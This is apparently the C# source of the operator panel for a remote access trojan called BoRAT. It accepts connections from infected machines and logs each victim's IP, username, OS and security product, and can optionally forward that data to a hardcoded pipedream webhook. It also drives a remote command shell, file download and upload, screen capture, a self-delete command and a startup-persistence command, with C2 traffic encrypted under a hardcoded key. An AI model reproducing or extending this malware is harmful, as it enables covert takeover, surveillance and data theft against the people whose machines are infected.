using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace BoRAT.Server
{
    public partial class frmMain : Form
    {
        // CHANGE THESE
        private readonly bool pipedreamEnabled = false;
        private readonly string pipedreamEndpoint = @"https://eonvuonqbllwqpu.m.pipedream.net";
        private readonly string encryptionKey = "B0r@t2022!!";

        // Networking
        private Socket serverSocket { get; set; }
        private Socket targetClient { get; set; }
        private readonly List<Socket> listSockets = new List<Socket>();
        private byte[] buffer { get; set; }
        private int bufferSize { get; set; }
        private int port { get; set; }

        // File Manager
        private int writeSize;
        private int fdlSize;
        private string dirPath { get; set; }
        private string fdl_location { get; set; }
        private string fup_location { get; set; }
        private bool isFileDownload { get; set; }
        private byte[] receiveFile = new byte[1];

        // Remote Desktop
        private bool fullScreen { get; set; }
        private bool isImage { get; set; }
        private frmRdp fullScreenRdp;


        public frmMain()
        {
            InitializeComponent();

            ColorListViewHeader(ref listClients, listClients.BackColor, listClients.ForeColor);
            ColorListViewHeader(ref listFileManager, listClients.BackColor, listClients.ForeColor);
        }

        public static void ColorListViewHeader(ref ListView list, Color backColor, Color foreColor)
        {
            list.OwnerDraw = true;
            list.DrawColumnHeader +=
                (sender, e) => HeaderDraw(sender, e, backColor, foreColor);
            list.DrawItem += BodyDraw;
        }

        private static void HeaderDraw(object sender, DrawListViewColumnHeaderEventArgs e, Color backColor,
            Color foreColor)
        {
            e.Graphics.FillRectangle(new SolidBrush(backColor), e.Bounds);
            e.Graphics.DrawString(e.Header.Text, e.Font, new SolidBrush(foreColor), e.Bounds);
        }

        private static void BodyDraw(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            try
            {
                // Set the new port.
                port = (int)Nport.Value;
            }
            catch (ArgumentOutOfRangeException)
            {
                // Notify that the port is too high.
                MessageBox.Show("Port value too high");
                return;
            }

            try
            {
                // Do some stuff with buffers.
                bufferSize = 104857600;
                buffer = new byte[bufferSize];

                // Create a new server socket.
                serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                // Create variable for local ip on the port.
                var ipEndPoint = new IPEndPoint(IPAddress.Any, port);

                // Bind the port to the ip.
                serverSocket.Bind(ipEndPoint);
                // Listen on the port.
                serverSocket.Listen(50);
                // Begin accepting the callbacks for the server.
                serverSocket.BeginAccept(AcceptCallback, serverSocket);

                // Update the status.
                UpdateStatus();
            }
            catch (SocketException msg)
            {
                // Show error message.
                MessageBox.Show(msg.Message);
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            // Create a new socket for the connection
            Socket connection;

            try
            {
                // End the accept request.
                connection = serverSocket.EndAccept(ar);
            }
            catch (SocketException msg)
            {
                // Show error message.
                MessageBox.Show(msg.Message);
                return;
            }

            // Add the connection to sockets list.
            listSockets.Add(connection);

            // Count the sockets list.
            var id = listSockets.Count;
            // Create the command string for getInfo.
            var command = string.Format("getInfo~{0}", id);

            // Add the client id.
            AddClientID(id);
            // Update the status.
            UpdateStatus();
            
            // Send the command with id.
            SendCommand(command, id);

            // Begin receiving the connections callbacks.
            connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, connection);
            // Begin accepting the connections callbacks.
            serverSocket.BeginAccept(AcceptCallback, null);
        }

        private void ReceiveCallback(IAsyncResult ar)
        {
            // Add the current socket.
            var currentSocket = (Socket)ar.AsyncState;

            // Create a variable for received.
            int recevied;

            try
            {
                // End the receive of the socket.
                recevied = currentSocket.EndReceive(ar);
            }
            catch (SocketException msg)
            {
                // Show the error message.
                MessageBox.Show(msg.Message);
                return;
            }

            // Create a new buffer for received.
            var receivedBuffer = new byte[recevied];

            // Copy the buffer to the new received buffer.
            Array.Copy(buffer, receivedBuffer, recevied);

            if (isImage)
                // Process a image.
                ProcessImage(receivedBuffer);
            if (isFileDownload)
                // Process a download.
                ProcessDUInfo(receivedBuffer);
            else if (!isFileDownload)
                // Process everything else.
                ProcessNormalInfo(receivedBuffer);

            // Begin receiving callbacks for the current socket.
            currentSocket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, currentSocket);
        }

        private void ProcessImage(byte[] data)
        {
            var header = Encoding.Unicode.GetString(data, 0, 16);
            if (header.Equals("rdpImage"))
                using (var ms = new MemoryStream())
                {
                    try
                    {
                        var image = (Bitmap)Image.FromStream(ms);

                        ms.Write(data, 16, data.Length - 16);
                        AddImage(image);
                        Array.Clear(data, 0, data.Length);
                    }

                    catch (Exception)
                    {
                        // Don't broadcast the error.
                    }
                }
        }

        private void ProcessNormalInfo(byte[] receivedBuffer, string command = "")
        {
            command = Encoding.Unicode.GetString(receivedBuffer);
            command = Decrypt(command);

            if (command.StartsWith("infoBack"))
            {
                var info = command.Split('|');
                AddClientInfo(info[1]);
            }

            else if (command.StartsWith("commandout§"))
            {
                var results = command.Split('§')[1];
                UpdateUI(() => Logs.Text += results);
            }

            else if (command.StartsWith("drivesList~"))
            {
                UpdateUI(() => listFileManager.Items.Clear());

                var drives = command.Split('~')[1];
                var drivesList = drives.Split('\n');
                foreach (var driverInfo in drivesList)
                {
                    if (!driverInfo.Contains("|"))
                        continue;

                    var name = driverInfo.Split('|')[0];
                    var size = driverInfo.Split('|')[1];

                    AddFileManagerInfo(name, size, "N/A", name);
                }
            }

            else if (command.StartsWith(""))
            {
                UpdateUI(() =>
                    rtbLog.Text += "[" + DateTime.Now.ToString("h:mm:ss tt") + "] " + command + Environment.NewLine);
            }

            else if (command.StartsWith("enterPath~"))
            {
                UpdateUI(() => listFileManager.Items.Clear());
                var info = command.Split('~')[1];
                var directories = info.Split('\n');

                foreach (var s in directories)
                {
                    if (s == "")
                        continue;
                    var name = s.Split('|')[0];
                    var size = s.Split('|')[1];
                    var creationTime = s.Split('|')[2];
                    var path = s.Split('|')[3];

                    AddFileManagerInfo(name, size, creationTime, path);
                }
            }

            else if (command.StartsWith("backPath~"))
            {
                var info = command.Split('~')[1];

                if (info.Equals("driveList"))
                {
                    UpdateUI(() => drivesListToolStripMenuItem.PerformClick());
                }

                else
                {
                    dirPath = info;
                    SendCommandToTarget("enterPath~" + info);
                }
            }

            else if (command.StartsWith("fInfo~"))
            {
                var size = int.Parse(command.Split('~')[1]);
                fdlSize = size;
                receiveFile = new byte[fdlSize];
                isFileDownload = true;
                SendCommandToTarget("fdlConfirm");
            }

            else if (command.Equals("fupConfirm"))
            {
                UpdateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
                                                       "Uploading " + Path.GetFileName(fup_location) + " To " +
                                                       dirPath + "\n");
                var dataToSend = File.ReadAllBytes(fup_location);
                SendFileToTarget(dataToSend);
            }

            else if (command.Equals("fileReceived"))
            {
                UpdateUI(() => LogsFileManager.Text += "Uploaded.\n");
            }

            else if (command.StartsWith("error~"))
            {
                ProcessErrors(command.Split('~')[1]);
            }
        }

        private void ProcessDUInfo(byte[] buffer)
        {
            UpdateUI(() => LogsFileManager.Text += "Download Request Accepted.\n");
            UpdateUI(() => LogsFileManager.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
            writeSize = 0;
            Buffer.BlockCopy(buffer, 0, receiveFile, writeSize, buffer.Length);
            writeSize += buffer.Length;

            if (writeSize == fdlSize)
                using (var fs = File.Create(fdl_location))
                {
                    var info = receiveFile;
                    fs.Write(info, 0, info.Length);
                }
            
            Array.Clear(receiveFile, 0, receiveFile.Length);
            UpdateUI(() => LogsFileManager.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
            isFileDownload = false;
        }

        private void ProcessErrors(string errorText)
        {
            if (errorText.ToLower().Contains("commandFailed"))
            {
                MessageBox.Show("Start command before use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (errorText.ToLower().Contains("directory") || errorText.ToLower().Contains("file") ||
                errorText.ToLower().Contains("enterpath") || errorText.ToLower().Contains("access"))
                UpdateUI(() => LogsFileManager.Text += errorText);
        }

        private void SendCommand(string command, int id)
        {
            var socket = listSockets[id - 1];
            var data = Encoding.Unicode.GetBytes(command);
            socket.Send(data);
        }

        private void SendCommandToTarget(string command)
        {
            if (targetClient != null)
            {
                command = Encrypt(command);
                var dataToSend = Encoding.Unicode.GetBytes(command);
                targetClient.Send(dataToSend);
            }

            else
            {
                MessageBox.Show("Select a target first!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SendFileToTarget(byte[] data)
        {
            try
            {
                targetClient.Send(data);
            }
            catch (Exception ex)
            {
                UpdateUI(() => LogsFileManager.Text += ex.Message + "\n");
            }
        }

        private void AddImage(Bitmap image)
        {
            if (!fullScreen)
                UpdateUI(() => pBRdp.Image = image);
            else
                fullScreenRdp.image = image;
        }

        private void AddClientID(int id)
        {
            UpdateUI(() => listClients.Items.Add(id.ToString()));
        }

        private void AddClientInfo(string info)
        {
            var data = info.Split('~');
            var id = int.Parse(data[0]);
            var client = new ListViewItem();
            UpdateUI(() => client = listClients.Items[id - 1]);
            UpdateUI(() => client.SubItems.Add(data[1]));
            UpdateUI(() => client.SubItems.Add(data[2]));
            UpdateUI(() => client.SubItems.Add(data[3]));
            UpdateUI(() => client.SubItems.Add(data[4]));
            UpdateUI(() => client.SubItems.Add(data[5]));

            if (pipedreamEnabled)
            {
                // Start a pipedream client
                var pipedreamClient = new HttpClient();
                // Add the client data to the request
                var pipedreamData = new[]
                {
                    new KeyValuePair<string, string>("pubip", data[1]),
                    new KeyValuePair<string, string>("username", data[2]),
                    new KeyValuePair<string, string>("os", data[3]),
                    new KeyValuePair<string, string>("security", data[4]),
                    new KeyValuePair<string, string>("datetime", data[5])
                };
                // Post the request to pipedream
                pipedreamClient.PostAsync(pipedreamEndpoint, new FormUrlEncodedContent(pipedreamData)).GetAwaiter()
                    .GetResult();
            }
        }

        private void AddFileManagerInfo(string name, string size, string creationTime, string path)
        {
            if (!size.Equals("N/A"))
                size = FormatBytes(long.Parse(size));
            var lvi = new ListViewItem();
            lvi.Text = name;
            lvi.SubItems.Add(size);
            lvi.SubItems.Add(creationTime);
            lvi.SubItems.Add(path);

            UpdateUI(() => listFileManager.Items.Add(lvi));
            UpdateUI(() => listFileManager.Items[0].Selected = true);
        }

        //stackoverflow.com/questions/1242266/converting-bytes-to-gb-in-c
        private static string FormatBytes(long bytes)
        {
            string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024) dblSByte = bytes / 1024.0;

            return string.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        private void UpdateStatus(string text = "n")
        {
            if (text.Equals("n"))
                UpdateUI(() => lblStatus.Text =
                    string.Format("Status: Listening on port {0} | Connections: {1}", port, listClients.Items.Count));
            else
                UpdateUI(() => lblStatus.Text =
                    string.Format(text));
        }

        private void UpdateUI(Action action)
        {
            Invoke(new Action(action), null);
        }

        private void listClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                if (listClients.FocusedItem.Bounds.Contains(e.Location))
                    MenuClients.Show(Cursor.Position);
        }

        private void selectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listClients.Items.Count > 0)
            {
                int id;
                var item = listClients.FocusedItem;
                id = int.Parse(item.SubItems[0].Text);
                targetClient = listSockets[id - 1];
                var username = item.SubItems[2].Text;
                var connection = item.SubItems[1].Text;
                var statusText = string.Format("Status: Listening on port {0} | Connections: {1} | Target: {2}", port,
                    listClients.Items.Count, username);
                UpdateStatus(statusText);

                UpdateUI(() =>
                    lblStatusCmdShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                UpdateUI(() =>
                    lblStatusFileManager.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                UpdateUI(
                    () => lblStatusRdp.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
            }
        }

        private void txtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                var info = "command§" + txtCommand.Text;
                //targetClient.Send(Encoding.Unicode.GetBytes(info));
                SendCommandToTarget(info);
                txtCommand.Text = "";
            }

            else if (e.KeyCode == Keys.Return && txtCommand.Text.ToLower().Equals("cls"))
            {
                Logs.Text = "";
            }
        }

        private void runCmdShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Request a remote shell.
            SendCommandToTarget("startcommand");
        }

        public string Encrypt(string clearText)
        {
            var clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (var encryptor = Rijndael.Create())
            {
                var pdb = new Rfc2898DeriveBytes(encryptionKey,
                    new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }

                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }

            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                var cipherBytes = Convert.FromBase64String(cipherText);
                using (var encryptor = Rijndael.Create())
                {
                    var pdb = new Rfc2898DeriveBytes(encryptionKey,
                        new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }

                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }

                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }

        private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Request the list of drives.
            dirPath = "drivesList";
            SendCommandToTarget("drivesList");
        }

        private void enterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listFileManager.SelectedIndices.Count > 0)
            {
                var pathToEnter = listFileManager.SelectedItems[0].SubItems[3].Text;
                dirPath = pathToEnter;
                SendCommandToTarget("enterPath~" + pathToEnter);
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dirPath.Equals("drivesList"))
                return;
            SendCommandToTarget("backPath~" + dirPath);
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listFileManager.SelectedItems.Count > 0)
            {
                if (listFileManager.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
                {
                    UpdateUI(() => LogsFileManager.Text += "Cannot Download a Directory!+\n");
                    return;
                }

                if (!File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\TargetDownloads"))
                    Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\TargetDownloads");

                var filename = listFileManager.SelectedItems[0].SubItems[3].Text;
                UpdateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
                fdl_location = "TargetDownloads\\" + Path.GetFileName(filename);
                SendCommandToTarget("fdl~" + filename);
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var info = dirPath;
            var fileName = "";

            var ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
                fup_location = ofd.FileName;

            fileName = Path.GetFileName(fup_location);
            info += "\\" + fileName + "~" + new FileInfo(fup_location).Length;

            LogsFileManager.Text += "Sending Upload Request ...";
            SendCommandToTarget("fup~" + info);
        }

        private void btnStartRdp_Click(object sender, EventArgs e)
        {
            // Create new RDP form.
            fullScreenRdp = new frmRdp();

            // Disable full screen.
            fullScreen = false;
            // Turn RDP into image.
            isImage = true;

            // Start the RDP session.
            SendCommandToTarget("rdpStart");
        }

        private void btnRdpStop_Click(object sender, EventArgs e)
        {
            // Disable image.
            isImage = false;

            // Dispose of the RDP image.
            if (pBRdp.Image != null)
                UpdateUI(() => pBRdp.Image.Dispose());

            // Remove the RDP image.
            UpdateUI(() => pBRdp.Image = null);
            // Change the RDP selection to zoom screen.
            UpdateUI(() => comboRdp.SelectedIndex = 0);

            // Close the full screen RDP.
            if (fullScreenRdp != null)
                fullScreenRdp.Close();

            // Stop the RDP session.
            SendCommandToTarget("rdpStop");
        }

        private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboRdp.SelectedIndex)
            {
                case 0: // Zoom Screen
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
                case 1: // CenterImage
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.CenterImage);
                    break;
                case 2: // AutoSize
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.AutoSize);
                    break;
                case 3: // Full Screen
                    fullScreen = true;
                    fullScreenRdp.Show();
                    break;
                default: // Zoom Screen
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            // Set the selection to the end of the log.
            rtbLog.SelectionStart = rtbLog.Text.Length;
            // Scroll the selection of the log.
            rtbLog.ScrollToCaret();
        }

        private void btnSuicide_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("suicide");
        }

        private void btnCopyToStartup_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("copyToStartup");
        }
    }
}